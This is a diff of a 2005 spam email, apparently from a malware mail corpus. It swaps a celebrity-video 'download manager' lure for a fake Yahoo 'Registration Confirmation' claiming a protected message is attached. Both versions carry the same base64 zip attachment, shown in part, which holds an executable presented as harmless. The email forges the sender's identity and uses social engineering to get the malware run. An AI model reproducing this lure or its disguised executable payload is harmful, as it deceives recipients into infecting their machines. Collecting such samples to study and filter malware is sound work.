@@ -1,30 +1,29 @@
-From: postman@ocf.berkeley.edu
-Subject: Paris Hilton & Nicole Richie
-Date: Sun, 18 Dec 2005 10:39:30 GMT
-Message-ID: <f976edafd794ec496e4@oss.sgi.com>
+From: hostmaster@yahoo.com
+Subject: Registration Confirmation
+Date: Sun, 18 Dec 2005 11:09:44 UTC
+Message-ID: <d96cf8ed9d0cb8037c6e@yahoo.com>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="===51eba5267a07a"
+Content-Type: multipart/mixed; boundary="======f08ffa6ddf29d5f058f0"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: priv-mail@oss.sgi.com
+To: x_mail-list@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---===51eba5267a07a
+--======f08ffa6ddf29d5f058f0
 
-The Simple Life:
+Protected message is attached!
 
-View Paris Hilton & Nicole Richie video clips , pictures & more ;)
-Download is free until Jan, 2006!
 
-Please use our Download manager.
---===51eba5267a07a
-Content-Type: application/octet-stream; name=downloadm.zip
+***** Go to: http://www.yahoo.com
+***** Email: postman@yahoo.com
+--======f08ffa6ddf29d5f058f0
+Content-Type: application/octet-stream; name=reg_pass.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="downloadm.zip"
+Content-Disposition: attachment; filename="reg_pass.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1001,4 +1000,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---===51eba5267a07a--
+--======f08ffa6ddf29d5f058f0--
